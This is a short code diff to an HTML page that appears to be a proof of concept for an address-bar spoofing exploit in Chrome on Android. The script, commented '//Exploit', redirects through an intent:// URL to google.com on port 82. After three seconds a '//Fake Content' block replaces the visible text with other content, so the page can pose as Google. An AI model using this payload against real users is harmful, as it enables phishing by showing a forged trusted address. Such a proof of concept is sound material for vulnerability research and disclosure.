@@ -1,5 +1,16 @@
-<h1>address spoof</h1>
+
+<h1 id="Text">Redirect Google.com</h1>
+<div id="content" style="display:none;">
+    <h1>This is not Google.com</h1>
+</div>
 
 <script>
+    //Exploit
     location.href = "intent://google.com:82/#Intent;scheme=https;package=com.android.chrome;end";
+
+    //Fake Content
+    setTimeout(() => {
+        document.getElementById("Text").style.display = 'none'
+        document.getElementById("content").style.display = 'block'
+    }, 3000);
 </script>
